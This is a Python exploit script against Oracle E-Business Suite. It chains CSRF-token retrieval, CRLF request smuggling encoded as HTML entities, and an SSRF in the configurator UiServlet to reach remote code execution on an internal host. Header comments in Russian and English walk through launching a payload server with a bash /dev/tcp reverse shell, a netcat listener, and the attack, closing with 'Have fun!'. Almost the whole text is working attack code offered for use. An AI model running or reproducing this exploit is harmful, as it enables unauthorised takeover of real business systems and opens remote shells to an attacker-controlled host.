import sys
import urllib.parse
import requests
import urllib3

# сначала запустите сервер // start server
# python3 server.py 7777 'bash -i >& /dev/tcp/X.X.X.X/51820 0>&1'
# запустить прослушиватель // start listener
# nc -lvp 51820
# начать атаку // start attack
# python3 exp.py http://TARGET:8000/  X.X.X.X:7777
# Веселиться! // Have fun!

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
sess = requests.session()

def get_csrf_token(target):
    global internal_host
    req = sess.get(target + "/OA_HTML/runforms.jsp", headers=header, allow_redirects=False)
    if req.status_code == 302:
        location = req.headers['Location']
        location_url = urllib.parse.urlparse(location)
        if location_url.hostname != internal_host:
            print(f'[*] reset internal_host: {location_url.hostname}')
        internal_host = location_url.hostname
        sess.get(f'{target}{location_url.path}?{location_url.query}')
    tmp_header = header
    tmp_header["CSRF-XHR"] = "YES"
    tmp_header["FETCH-CSRF-TOKEN"] = "1"
    req = sess.post(target + "/OA_HTML/JavaScriptServlet", headers=tmp_header, )
    csrf_token = req.text.split(":")[1]
    if len(csrf_token) > 0:
        return csrf_token
    else:
        print(f'[*] Oops! No token!')
        exit(0)

def generate_ssrf_crlf_payload(payload):
    if payload.startswith("POST "):
        payload = payload[5:]
    elif payload.startswith("GET "):
        payload = payload = payload[4:]
    payload = payload.replace("\n", "\r\n")
    l = list(payload)
    html_payload = ''.join(['&#' + str(ord(i)) + ";" for i in l])
    return html_payload

def ssrf(target, payload):
    ssrf_xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<initialize>
    <param name="init_was_saved">test</param>
    <param name="return_url">http://{internal_host}:7201{payload}</param>
    <param name="ui_def_id">0</param>
    <param name="config_effective_usage_id">0</param>
    <param name="ui_type">Applet</param>
</initialize>'''

    print('[*] Stay tuned...')
    req = sess.post(target + "/OA_HTML/configurator/UiServlet", headers=header,
                    data={
                        "redirectFromJsp": "1",
                        "getUiType": ssrf_xml
                    })
    print(f'[*] BOOM HEADSHOT. Check server for access.')

def exploit(target, evil_server):
    csrf_token = get_csrf_token(target)
    keep_alive_payload = "\r\n\r\n\r\nPOST /"
    cookie_list = [f"{cookie.name}={cookie.value}" for cookie in sess.cookies]
    cookie_str = "; ".join(cookie_list)
    rce_payload = f'''POST /OA_HTML/help/../ieshostedsurvey.jsp HTTP/1.2
Host: {evil_server}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Connection: keep-alive
Cookie: {cookie_str}
'''
    print(f'[*] Cookie Built')
    rce_payload += keep_alive_payload
    payload = generate_ssrf_crlf_payload(rce_payload)
    ssrf(target, payload)
    print(f'[*] Payload Built')

if __name__ == "__main__":

    if len(sys.argv) != 3:
        print('python3 server.py target_url config_server_host_port')
        print('python3 server.py http://apps.example.com:8000/ 8.8.8.8:80')
        exit(0)

    target = sys.argv[1]
    evil_server = sys.argv[2]
    internal_host = urllib.parse.urlparse(target).hostname
    if target.endswith("/"):
        target = target[:-1]

    print(f'[*] Host: {internal_host}')

    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
    }

    sess.verify = False

    exploit(target, evil_server)
